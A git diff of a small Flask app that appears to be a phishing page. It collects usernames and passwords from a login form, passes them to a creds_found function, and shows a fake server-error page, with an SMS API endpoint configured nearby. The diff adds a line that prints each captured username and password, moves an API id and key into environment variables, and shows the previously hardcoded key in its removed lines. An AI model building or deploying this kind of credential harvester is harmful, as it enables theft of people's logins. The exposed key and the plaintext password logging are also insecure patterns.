@@ -1,7 +1,7 @@
 from flask import Flask, render_template, redirect, url_for, flash, request
 import requests
 from flask_sqlalchemy import SQLAlchemy
-
+import os
 app = Flask(__name__)
 app._static_folder = 'static'
 app.config['SECRET_KEY'] = 'mysecretkey'
@@ -12,8 +12,8 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
 endpoint= "https://app.notify.lk/api/v1/send"
-id='24452'
-key="M43tLIg3XedtkzORZkmP"
+id =os.getenv("USER_ID")
+key =os.getenv("API")
 
 class User(db.Model):
     # __tablename__ = 'users'
@@ -40,10 +40,11 @@ def creds_found(user, psk):
 
 @app.route('/',methods=['GET','POST'])
 def load_index():
-    print("clicked and visited")
+
     if request.method == 'POST':
         user = request.form.get('username')
         password = request.form.get('password')
+        print(f"userN:{user}, PSK:{password}")
         creds_found(user,password)
         return "<html><h3>500 internal server error</h3><br>try again later</html>"
     return render_template("index.html")
